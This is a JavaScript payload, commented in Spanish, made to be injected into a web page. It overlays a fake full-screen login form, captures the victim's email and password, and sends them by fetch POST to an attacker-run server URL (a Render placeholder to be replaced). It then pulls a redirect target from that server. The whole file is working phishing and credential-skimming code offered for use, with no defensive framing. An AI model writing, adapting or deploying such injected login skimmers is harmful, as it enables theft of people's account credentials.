(function() {
    // CAMBIA ESTA URL POR LA QUE TE DE RENDER:
    const SERVER_URL = "https://tu-app-en-render.onrender.com";

    const overlay = document.createElement('div');
    overlay.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;font-family:sans-serif;";
    overlay.innerHTML = `
        <div style="background:white;padding:30px;border-radius:12px;width:350px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);">
            <h2 style="color:#2563eb;margin-bottom:20px;">Iniciar Sesión</h2>
            <input id="inj-email" type="text" placeholder="Correo electrónico" style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;">
            <input id="inj-pass" type="password" placeholder="Contraseña" style="width:100%;padding:12px;margin-bottom:20px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;">
            <button id="inj-btn" style="width:100%;padding:14px;background:#2563eb;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">Entrar</button>
        </div>
    `;
    document.body.appendChild(overlay);

    document.getElementById('inj-btn').onclick = async function() {
        const email = document.getElementById('inj-email').value;
        const password = document.getElementById('inj-pass').value;
        if(!email || !password) return alert("Completa los datos");

        this.disabled = true;
        this.innerText = "Verificando...";

        try {
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });

            const res = await fetch(`${SERVER_URL}/config`);
            const config = await res.json();

            setTimeout(() => {
                window.location.href = config.redirect_url;
            }, 1000);
        } catch(e) {
            alert("Error de conexión");
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
